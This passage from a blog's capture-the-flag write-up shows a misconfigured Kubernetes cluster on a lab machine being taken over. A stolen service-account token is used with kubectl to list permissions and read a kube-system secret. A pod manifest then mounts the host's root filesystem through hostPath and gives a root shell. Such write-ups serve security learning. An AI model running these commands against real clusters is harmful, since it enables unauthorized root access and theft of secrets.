</span></span><span style=display:flex><span>lrwxrwxrwx    <span style=color:#ae81ff>1</span> root     root            <span style=color:#ae81ff>13</span> Oct <span style=color:#ae81ff>26</span> 17:25 ca.crt -&gt; ..data/ca.crt
</span></span><span style=display:flex><span>lrwxrwxrwx    <span style=color:#ae81ff>1</span> root     root            <span style=color:#ae81ff>16</span> Oct <span style=color:#ae81ff>26</span> 17:25 namespace -&gt; ..data/namespace
</span></span><span style=display:flex><span>lrwxrwxrwx    <span style=color:#ae81ff>1</span> root     root            <span style=color:#ae81ff>12</span> Oct <span style=color:#ae81ff>26</span> 17:25 token -&gt; ..data/token
</span></span><span style=display:flex><span>bash-4.4$ cat token
</span></span><span style=display:flex><span>eyJhbGciOiJSUzI1NiIsIm<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>BAx_djkHFv3vza54WS9w
</span></span></code></pre></div><h2 id=flag-3>Flag 3</h2><p>And here comes the sweet part of this machine! <em>&ldquo;Abuse a misconfigured Kubernetes cluster&rdquo;</em></p><p>So let&rsquo;s Ab-use this cluster!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ /tmp/kubectl --token <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>cat token.txt<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> --insecure-skip-tls-verify --server<span style=color:#f92672>=</span>https://10.10.24.160:6443 auth can-i --list
</span></span><span style=display:flex><span>Resources   Non-Resource URLs   Resource Names   Verbs
</span></span><span style=display:flex><span>*.*         <span style=color:#f92672>[]</span>                  <span style=color:#f92672>[]</span>               <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span>                 <span style=color:#f92672>[]</span>               <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>╰─ lanfran@parrot ❯ /tmp/kubectl --token <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>cat token.txt<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> --insecure-skip-tls-verify --server<span style=color:#f92672>=</span>https://10.10.24.160:6443 get namespaces
</span></span><span style=display:flex><span>NAME              STATUS   AGE
</span></span><span style=display:flex><span>default           Active   147d
</span></span><span style=display:flex><span>kube-system       Active   147d
</span></span><span style=display:flex><span>kube-public       Active   147d
</span></span><span style=display:flex><span>kube-node-lease   Active   147d
</span></span></code></pre></div><p>After this easy enumeration, we know all the namespaces, and that we have access to all of them!</p><p>Now let&rsquo;s get the secret of the <code>kube-system</code>, so we can read the flag3!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ /tmp/kubectl --token <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>cat token.txt<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> --insecure-skip-tls-verify --server<span style=color:#f92672>=</span>https://10.10.24.160:6443 get secrets flag3 -o yaml -n kube-system
</span></span><span style=display:flex><span>apiVersion: v1
</span></span><span style=display:flex><span>data:
</span></span><span style=display:flex><span>  flag3.txt: Zmx<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>IX0<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>kind: Secret
</span></span><span style=display:flex><span>metadata:
</span></span><span style=display:flex><span>  annotations:
</span></span><span style=display:flex><span>    kubectl.kubernetes.io/last-applied-configuration: |
</span></span><span style=display:flex><span>      <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;apiVersion&#34;</span>:<span style=color:#e6db74>&#34;v1&#34;</span>,<span style=color:#e6db74>&#34;kind&#34;</span>:<span style=color:#e6db74>&#34;Secret&#34;</span>,<span style=color:#e6db74>&#34;metadata&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;annotations&#34;</span>:<span style=color:#f92672>{}</span>,<span style=color:#e6db74>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;flag3&#34;</span>,<span style=color:#e6db74>&#34;namespace&#34;</span>:<span style=color:#e6db74>&#34;kube-system&#34;</span><span style=color:#f92672>}</span>,<span style=color:#e6db74>&#34;stringData&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;flag3.txt&#34;</span>:<span style=color:#e6db74>&#34;flag{[REDACTED]}&#34;</span><span style=color:#f92672>}</span>,<span style=color:#e6db74>&#34;type&#34;</span>:<span style=color:#e6db74>&#34;Opaque&#34;</span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>  creationTimestamp: <span style=color:#e6db74>&#34;2021-05-31T22:01:30Z&#34;</span>
</span></span><span style=display:flex><span>  name: flag3
</span></span><span style=display:flex><span>  namespace: kube-system
</span></span><span style=display:flex><span>  resourceVersion: <span style=color:#e6db74>&#34;591&#34;</span>
</span></span><span style=display:flex><span>  uid: 599c6a8b-2a93-4253-a02c-6c0a7eccdc3f
</span></span><span style=display:flex><span>type: Opaque
</span></span></code></pre></div><h2 id=root--flag-4>Root / Flag 4</h2><p>After submitting the flag3, let&rsquo;s try to finish this machine, getting our way to &ldquo;root&rdquo;!</p><p>First let&rsquo;s get all the pods, and the information of them!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ /tmp/kubectl --token <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>cat token.txt<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> --insecure-skip-tls-verify --server<span style=color:#f92672>=</span>https://10.10.24.160:6443 get pods                                  ─╯
</span></span><span style=display:flex><span>NAME                     READY   STATUS    RESTARTS   AGE
</span></span><span style=display:flex><span>gitea-0                  1/1     Running   <span style=color:#ae81ff>2</span>          147d
</span></span><span style=display:flex><span>nginx-7f459c6889-8slv2   1/1     Running   <span style=color:#ae81ff>2</span>          147d
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>╰─ lanfran@parrot ❯ /tmp/kubectl --token <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>cat token.txt<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> --insecure-skip-tls-verify --server<span style=color:#f92672>=</span>https://10.10.24.160:6443 get pod nginx-7f459c6889-8slv2 -o yaml    ─╯
</span></span><span style=display:flex><span>apiVersion: v1
</span></span><span style=display:flex><span>kind: Pod
</span></span><span style=display:flex><span>metadata:
</span></span><span style=display:flex><span>  creationTimestamp: <span style=color:#e6db74>&#34;2021-05-31T21:57:34Z&#34;</span>
</span></span><span style=display:flex><span>  generateName: nginx-7f459c6889-
</span></span><span style=display:flex><span>  labels:
</span></span><span style=display:flex><span>    app: nginx
</span></span><span style=display:flex><span>    pod-template-hash: 7f459c6889
</span></span><span style=display:flex><span>  name: nginx-7f459c6889-8slv2
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>  containerStatuses:
</span></span><span style=display:flex><span>  - containerID: containerd://0a3ab874a77bbbaf2767c915a76d202d9179f70d635e35c429d2806ca2fde4fa
</span></span><span style=display:flex><span>    image: docker.io/library/nginx:latest
</span></span><span style=display:flex><span>    imageID: docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750
</span></span><span style=display:flex><span>    lastState:
</span></span><span style=display:flex><span>      terminated:
</span></span><span style=display:flex><span>        containerID: containerd://11b48c2a2652638f80a7376f6c2ad107e4040f8348b301db5d24c80226d57665
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>We have a docker container running a nginx image on this pod! <em>As I supposed before!</em></p><p>Now, to get root, let&rsquo;s upload and apply a malicious configuration, containing an exploit to mount the root directory &ldquo;/&rdquo; into our new directory &ldquo;pwned&rdquo; and we also can get a root shell with this config!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ cat pwned.yaml                                                                                                  ─╯
</span></span><span style=display:flex><span>apiVersion: v1
</span></span><span style=display:flex><span>kind: Pod
</span></span><span style=display:flex><span>metadata:
</span></span><span style=display:flex><span>  name: pwned
</span></span><span style=display:flex><span>spec:
</span></span><span style=display:flex><span>  volumes:
</span></span><span style=display:flex><span>  - name: pwned
</span></span><span style=display:flex><span>    hostPath:
</span></span><span style=display:flex><span>      path: /
</span></span><span style=display:flex><span>      type: Directory                                                                                                         
</span></span><span style=display:flex><span>  containers:
</span></span><span style=display:flex><span>  - image: docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750
</span></span><span style=display:flex><span>    name: pwned
</span></span><span style=display:flex><span>    command: <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;/bin/bash&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>, <span style=color:#e6db74>&#34;--&#34;</span> <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    args: <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;while true; do sleep 30; done;&#34;</span> <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    volumeMounts:
</span></span><span style=display:flex><span>    - mountPath: /pwned
</span></span><span style=display:flex><span>      name: pwned
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ /tmp/kubectl --token <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>cat token.txt<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> --insecure-skip-tls-verify --server<span style=color:#f92672>=</span>https://10.10.24.160:6443 -n default apply -f pwned.yaml            ─╯
</span></span><span style=display:flex><span>pod/pwned-pod created
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>╰─ lanfran@parrot ❯ /tmp/kubectl --token <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>cat token.txt<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> --insecure-skip-tls-verify --server<span style=color:#f92672>=</span>https://10.10.24.160:6443 get pods  ─╯
</span></span><span style=display:flex><span>NAME                     READY   STATUS    RESTARTS   AGE
</span></span><span style=display:flex><span>nginx-7f459c6889-8slv2   1/1     Running   <span style=color:#ae81ff>2</span>          147d
</span></span><span style=display:flex><span>gitea-0                  1/1     Running   <span style=color:#ae81ff>2</span>          147d
</span></span><span style=display:flex><span>pwned-pod                1/1     Running   <span style=color:#ae81ff>0</span>          44s
</span></span></code></pre></div><p>There is our new pod created, now just remains to connect to the pod and get the root flag!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ /tmp/kubectl --token <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>cat token.txt<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> --insecure-skip-tls-verify --server<span style=color:#f92672>=</span>https://10.10.24.160:6443 -n default exec -it pwned-pod bash            ─╯
</span></span><span style=display:flex><span>kubectl exec <span style=color:#f92672>[</span>POD<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>COMMAND<span style=color:#f92672>]</span> is DEPRECATED and will be removed in a future version. Use kubectl exec <span style=color:#f92672>[</span>POD<span style=color:#f92672>]</span> -- <span style=color:#f92672>[</span>COMMAND<span style=color:#f92672>]</span> instead.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>root@pwned-pod:/# id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>root@pwned-pod:/# cat /pwned/root/root.txt
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
</span></span></code></pre></div><p>And we rooted the machine!</p><p>That&rsquo;s all from my side, hope you find this helpful!</p></div><div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Read other posts</span>
<hr>
</div><div class=pagination__buttons>
<span class="button previous">
<a href=/posts/eko-2021/>
<span class=button__icon>←</span>
<span class=button__text>Ekoparty 2021 - Write Up</span>
</a>
</span>
<span class="button next">
<a href=/posts/zeno/>
<span class=button__text>Zeno - Write Up</span>
<span class=button__icon>→</span>
</a>
</span>
</div></div><div id=hyvor-talk-view></div><script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script>
<script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script>
</div></div><footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div></div></footer><script src=/assets/main.js></script>
<script src=/assets/prism.js></script><script src=/assets/medium-zoom/medium-zoom.min.js></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(e=>{mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script>
<script type=module src=/assets/ionicons/ionicons.esm.js></script>
<script nomodule src=/assets/ionicons/ionicons.js></script>
</div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script>
</body></html>